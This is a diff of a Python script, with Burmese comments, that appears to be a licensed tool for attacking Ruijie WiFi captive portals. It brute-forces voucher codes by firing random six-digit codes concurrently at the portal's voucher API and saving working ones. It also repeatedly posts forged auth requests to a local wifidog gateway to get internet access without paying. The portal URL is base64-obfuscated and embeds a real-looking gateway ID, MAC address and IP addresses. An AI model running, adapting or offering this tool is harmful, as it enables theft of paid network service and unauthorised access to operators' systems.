@@ -1,7 +1,6 @@
 import os
 import re
 import sys
-import uuid
 import time
 import ping3
 import base64
@@ -14,25 +13,16 @@ import argparse
 import requests
 from datetime import datetime
 
-# --- UI & COLORS ---
+# --- UI COLORS ---
 w = "\033[1;00m"
 g = "\033[1;32m"
 y = "\033[1;33m"
 r = "\033[1;31m"
 b = "\033[1;34m"
 
-def clear():
-    os.system("clear" if os.name == "posix" else "cls")
-
-def Line():
-    try:
-        cols = os.get_terminal_size()[0]
-    except:
-        cols = 40
-    print(f"{y}-" * cols + f"{w}")
-
+# --- UI & LOGO ---
 def Logo():
-    clear()
+    os.system("clear" if os.name == "posix" else "cls")
     logo = f"""{r}  __  __  ____  ______     ____  _ 
  |  \/  |/ __ \|  ____|   |  _ \| |
  | \  / | |  | | |__      | |_) | |
@@ -40,78 +30,78 @@ def Logo():
  | |  | | |__| | |____    | |_) |_|
  |_|  |_|\____/|______|   |____/(_)
                                    
-{g}              Created by MOEYU [ULTRA STABLE]{w}"""
+{g}              Created by MOEYU [STABLE V3]{w}"""
     print(logo)
-    Line()
-    print(f"{w}[♠️] Created by Moe Yu")
+    print(f"{y}-" * 45)
+    print(f"{w}[♠️] Developer: Moe Yu")
     print(f"{w}[♣️] Telegram: @starlink112")
-    print(f"{w}[♦️] Status: Fixed ID Locked")
-    Line()
+    print(f"{w}[♦️] Status: Licensed (Fixed ID)")
+    print(f"{y}-" * 45)
 
-# --- FIXED ID SYSTEM (MAC Address မသုံးတော့ဘဲ စနစ်ကို ပြောင်းထားသည်) ---
+# --- SECURITY SYSTEM (FIXED ID & NO CACHE) ---
 def get_hwid():
-    """ဖုန်းရဲ့ hardware အချက်အလက်တွေကို သုံးပြီး ပုံသေ ID ထုတ်ယူခြင်း (MAC မပါ)"""
+    """ဖုန်းရဲ့ Fixed ID ကို ထုတ်ယူခြင်း (တစ်ခါ run တိုင်း မပြောင်းပါ)"""
     try:
-        # MAC Address (uuid.getnode) ကို မသုံးတော့ပါ (အဲ့ဒါကြောင့် ID ခဏခဏပြောင်းတာပါ)
-        # အစားထိုးအနေနဲ့ User ID, CPU count နဲ့ စက်ရဲ့ နာမည်ကို သုံးပါမယ်
         user = os.environ.get('USER', 'default')
-        arch = os.environ.get('ARCH', 'unknown')
         cpu = str(os.cpu_count())
-        
-        # ဤအချက်အလက်များကို ပေါင်းပြီး Hash လုပ်ပါမယ်
-        raw_id = f"{user}-{arch}-{cpu}-MOEYU-STABLE"
-        fixed_hash = hashlib.sha1(raw_id.encode()).hexdigest()[:12].upper()
-        return f"MY-{fixed_hash}"
+        # MAC မသုံးဘဲ Environment data ကိုပဲသုံး၍ ID ထုတ်ခြင်း
+        raw_id = f"{user}-{cpu}-MOEYU-STABLE"
+        fixed_id = hashlib.sha1(raw_id.encode()).hexdigest()[:12].upper()
+        return f"MY-{fixed_id}"
     except:
-        return "MY-STABLE-USER"
+        return "MY-UNKNOWN-ID"
 
 def check_license():
     Logo()
-    my_hwid = get_hwid()
-    # Github URL
+    my_id = get_hwid()
+    # သင်၏ GitHub Raw URL
     key_url = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"
     
-    print(f"{b}[*] Your ID: {y}{my_hwid}{w}")
-    print(f"{b}[*] Checking License...{w}")
+    print(f"{b}[*] Your ID: {y}{my_id}{w}")
+    print(f"{b}[*] Checking license status...{w}")
     
     try:
-        # Cache မမိအောင် Random Params ထည့်ဆွဲပါမယ်
-        response = requests.get(f"{key_url}?t={time.time()}", timeout=15)
+        # Cache မမိစေရန် Random Parameter ထည့်ခြင်း
+        response = requests.get(f"{key_url}?v={random.randint(1000, 9999)}", timeout=10)
+        
         if response.status_code != 200:
-            print(f"{r}[!] Server Error! Check your Internet.{w}")
+            print(f"{r}[!] Connection Error (Status: {response.status_code}){w}")
             sys.exit()
             
-        data = response.text.splitlines()
-        found = False
+        lines = response.text.splitlines()
+        is_verified = False
         
-        for line in data:
+        for line in lines:
             if "|" in line:
                 db_id, exp_date = line.split("|")
-                if db_id.strip() == my_hwid:
-                    found = True
+                # Space တွေပါခဲ့ရင် ဖယ်ထုတ်ရန် strip() သုံးခြင်း
+                if db_id.strip() == my_id:
+                    is_verified = True
                     expiry = datetime.strptime(exp_date.strip(), "%Y-%m-%d")
                     if datetime.now() < expiry:
-                        print(f"{g}[+] Verified! Expires: {exp_date}{w}")
+                        print(f"{g}[+] Verified Successfully! Expires: {exp_date}{w}")
                         time.sleep(2)
                         return True
                     else:
-                        print(f"{r}[!] License Expired on {exp_date}{w}")
+                        print(f"{r}[!] Your license expired on {exp_date}{w}")
                         sys.exit()
         
-        if not found:
-            print(f"{r}[!] ID Not Registered!{w}")
-            print(f"{y}[>] Send this ID to Admin: {w}{my_hwid}")
+        if not is_verified:
+            print(f"{r}[!] ID Not Registered in Server!{w}")
+            print(f"{y}[>] Send this ID to Admin: {w}{my_id}")
+            # Debug: Server ထဲမှာ လက်ရှိရှိနေတဲ့ စာသားကိုပါ ပြပေးခြင်း
+            print(f"\n{b}[Server Data Debug]:\n{w}{response.text}")
             sys.exit()
             
     except Exception as e:
-        print(f"{r}[!] Connection Failed: {str(e)}{w}")
+        print(f"{r}[!] Security Error: {str(e)}{w}")
         sys.exit()
 
-# --- CORE FEATURES ---
-async def get_session_id(session, url):
+# --- CORE LOGIC (INTERNET & CODE) ---
+async def get_sid(session, url):
     try:
         async with session.get(url) as r:
-            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url)).group(1)
+            return re.search(r"sessionId=([a-zA-Z0-9]+)", str(r.url)).group(1)
     except: return None
 
 class InternetAccess:
@@ -121,50 +111,57 @@ class InternetAccess:
     async def execute(self):
         Logo()
         async with aiohttp.ClientSession() as s:
-            sid = await get_session_id(s, self.url)
+            sid = await get_sid(s, self.url)
             while True:
                 try:
-                    p = {'token': sid, 'phoneNumber': "".join(random.choice(string.digits) for _ in range(6))}
-                    async with s.post('http://192.168.0.1:2060/wifidog/auth?', params=p) as res:
-                        ping_st = await asyncio.to_thread(ping3.ping, 'google.com')
-                        ms = int(ping_st*1000) if ping_st else '??'
+                    params = {'token': sid, 'phoneNumber': "".join(random.choice(string.digits) for _ in range(6))}
+                    async with s.post('http://192.168.0.1:2060/wifidog/auth?', params=params) as res:
+                        ping_res = await asyncio.to_thread(ping3.ping, 'google.com')
+                        ms = int(ping_res*1000) if ping_res else '??'
                         print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {g}{res.status}{w} | Ping: {g}{ms}{w}ms")
                 except: pass
                 await asyncio.sleep(1)
 
-class VoucherCode:
+class VoucherCrack:
     def __init__(self, l=6, s=50):
         self.l, self.s = l, s
         self.url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
 
-    async def login(self, s, sid, v):
+    async def check_v(self, s, sid, v):
         try:
-            u = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
-            async with s.post(u, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as r:
-                if 'logonUrl' in await r.text():
-                    print(f'\n{g}[SUCCESS] {v}{w}')
-                    open("success.txt", "a").write(v + "\n")
-                else: print(f'{w}[*] Testing: {y}{v}{w}', end='\r')
+            api = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
+            async with s.post(api, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as res:
+                if 'logonUrl' in await res.text():
+                    print(f"\n{g}[SUCCESS] Code Found: {v}{w}")
+                    with open("success.txt", "a") as f: f.write(v + "\n")
+                else:
+                    print(f"{w}[*] Testing: {y}{v}{w}", end="\r")
         except: pass
 
     async def execute(self):
         Logo()
         async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.s)) as s:
-            sid = await get_session_id(s, self.url)
+            sid = await get_sid(s, self.url)
             while True:
-                ts = [self.login(s, sid, "".join(random.choice(string.digits) for _ in range(self.l))) for _ in range(self.s)]
-                await asyncio.gather(*ts)
+                tasks = [self.check_v(s, sid, "".join(random.choice(string.digits) for _ in range(self.l))) for _ in range(50)]
+                await asyncio.gather(*tasks)
 
+# --- MAIN RUNNER ---
 def main():
     check_license()
-    p = argparse.ArgumentParser()
-    p.add_argument("-o", "--option", choices=["code", "internet"], required=True)
-    p.add_argument("-l", "--length", type=int, default=6)
-    p.add_argument("-s", "--speed", type=int, default=50)
-    a = p.parse_args()
-    if a.option == "internet": asyncio.run(InternetAccess().execute())
-    else: asyncio.run(VoucherCode(l=a.length, s=a.speed).execute())
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-o", "--option", choices=["code", "internet"], required=True)
+    parser.add_argument("-l", "--length", type=int, default=6)
+    parser.add_argument("-s", "--speed", type=int, default=50)
+    args = parser.parse_args()
+
+    try:
+        if args.option == "internet":
+            asyncio.run(InternetAccess().execute())
+        else:
+            asyncio.run(VoucherCrack(l=args.length, s=args.speed).execute())
+    except KeyboardInterrupt:
+        print(f"\n{r}[!] Process Interrupted.{w}")
 
 if __name__ == "__main__":
-    try: main()
-    except KeyboardInterrupt: print(f"\n{r}[!] Stopped.{w}")
+    main()
